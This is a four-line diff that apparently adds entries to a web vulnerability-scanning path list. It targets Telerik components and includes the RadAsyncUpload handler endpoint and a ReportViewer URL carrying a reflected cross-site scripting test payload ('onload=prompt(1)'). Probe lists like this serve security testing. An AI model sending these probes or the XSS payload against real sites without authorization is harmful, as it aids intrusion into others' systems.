@@ -1,0 +1,4 @@
+/Account/Login
+{{paths}}
+/Telerik.Web.UI.WebResource.axd?type=rau
+/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
